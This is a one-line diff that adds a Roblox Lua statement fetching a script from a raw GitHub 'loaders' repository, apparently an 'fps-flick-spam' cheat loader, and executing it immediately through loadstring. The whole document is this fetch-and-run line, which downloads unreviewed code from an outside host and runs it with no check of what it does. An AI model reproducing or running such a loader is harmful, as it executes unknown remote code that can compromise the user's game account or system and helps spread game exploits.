@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/highwaymarevibrate/loaders/main/loaders/fps-flick-spam0-fdagsf9ymd4z6j.lua"))()
